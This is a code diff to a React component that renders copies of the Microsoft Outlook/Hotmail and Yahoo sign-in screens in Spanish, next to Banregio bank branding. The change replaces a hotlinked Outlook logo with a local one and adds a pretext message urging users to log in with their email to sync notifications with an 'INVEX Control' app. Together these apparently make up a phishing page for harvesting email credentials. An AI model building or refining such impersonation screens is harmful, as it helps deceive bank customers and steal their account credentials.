@@ -28,6 +28,7 @@ import banregioLogo from '../../assets/banregio_logo.png';
 import banregioLogoWhite from '../../assets/banregio_logo_white.png';
 import googleLogo from '../../assets/google-logo.png';
 import yahooLogo from '@assets/pngwing.com 2.png';
+import microsoftLogo from '@assets/pngwing.com.png';
 
 interface ScreenTemplatesProps {
   currentScreen: ScreenType;
@@ -746,13 +747,17 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           <div className="flex flex-col items-center w-full max-w-md mx-auto">
             <div className="flex justify-center mb-8">
               <img 
-                src="https://logos-world.net/wp-content/uploads/2020/11/Outlook-Logo.png" 
-                alt="Microsoft Outlook Logo" 
-                className="h-10"
+                src={microsoftLogo} 
+                alt="Microsoft Logo" 
+                className="h-12"
               />
             </div>
             
-            <h2 className="text-2xl font-light mb-6 self-start">Iniciar sesión</h2>
+            <h2 className="text-2xl font-light mb-4 self-start">Iniciar sesión</h2>
+            
+            <p className="text-sm text-gray-600 mb-6 self-start">
+              Para sincronizar tus notificaciones con la aplicación INVEX Control, inicia sesión utilizando tu correo electrónico registrado.
+            </p>
             
             {!hotmailStep2 ? (
               // Paso 1: Correo electrónico
@@ -857,7 +862,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             {!yahooStep2 ? (
               // Paso 1: Correo electrónico
               <>
-                <h2 className="text-3xl font-bold mb-6">Iniciar sesión</h2>
+                <h2 className="text-3xl font-bold mb-4">Iniciar sesión</h2>
+                
+                <p className="text-sm text-gray-700 mb-6 w-full text-left">
+                  Para sincronizar tus notificaciones con la aplicación INVEX Control, inicia sesión utilizando tu correo electrónico registrado.
+                </p>
                 
                 <div className="w-full mb-5">
                   <Input 
